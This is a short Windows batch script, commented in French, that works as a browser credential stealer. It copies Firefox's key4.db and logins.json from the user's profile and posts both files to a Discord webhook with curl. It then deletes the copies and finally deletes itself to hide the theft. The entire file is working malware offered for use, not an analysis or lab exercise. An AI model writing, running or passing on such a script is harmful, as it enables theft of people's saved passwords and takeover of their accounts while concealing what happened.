@echo off

set "sourcePath=%APPDATA%\Mozilla\Firefox\Profiles\*.default-release"
set "destinationPath=C:\temp"
set "webhookUrl=https://discord.com/api/webhooks/<WEBHOOKS>"

rem Copie des fichiers key4.db et logins.json vers le répertoire de destination en utilisant PowerShell
powershell -Command "Copy-Item -Path '%sourcePath%\key4.db' -Destination '%destinationPath%' -Force"
powershell -Command "Copy-Item -Path '%sourcePath%\logins.json' -Destination '%destinationPath%' -Force"

rem Envoi de la requête avec les fichiers joints en utilisant curl
curl -X POST "%webhookUrl%" ^
  -H "Content-Type: multipart/form-data" ^
  -F "payload_json={\"username\": \"test\", \"content\": \"hello\"}" ^
  -F "file1=@%destinationPath%\key4.db" ^
  -F "file2=@%destinationPath%\logins.json"

rem Suppression des fichiers copiés dans le répertoire temporaire
del "%destinationPath%\key4.db"
del "%destinationPath%\logins.json"

rem Suppression du script
del "%~f0"